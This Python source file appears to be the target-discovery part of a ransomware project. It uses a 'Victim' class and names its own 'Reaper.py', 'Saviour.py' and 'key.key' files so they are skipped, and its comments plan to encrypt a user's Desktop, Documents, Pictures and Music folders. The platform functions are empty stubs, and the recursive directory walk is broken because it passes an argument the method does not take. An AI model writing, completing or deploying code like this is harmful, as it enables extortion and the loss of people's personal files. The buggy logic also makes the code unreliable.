import os
from Victim import Victim
import subprocess

class Target_detection:
    def __init__(self):
        self.victim_machine = Victim()
        self.target_path = self.victim_machine.get_target_dir()
        self.targets = []

    def gather_targets_linux(self):
        # Execute 'whoami' to get the user
        # cd into that user's directory inside 'home'
        # Proceed to encrypt files in any of the directories:
        # Desktop
        # Documents
        # Pictures
        # Music
        pass

    def gather_targets_windows(self, target_path):
        pass

    def gather_targets(self):
            for file in os.scandir(self.target_path):
                name = file.path.split("\\")[-1]

                if name == "Reaper.py" or name == "key.key" or name == "Saviour.py":
                    continue

                if file.is_dir():
                    if name == "venv" or name == ".git" or name == "inspectionProfiles" or name == ".idea":
                        continue
                    self.gather_targets(file)

                else:
                    self.targets.append(file.path)

tr = Target_detection()
tr.gather_targets_windows(tr.target_path)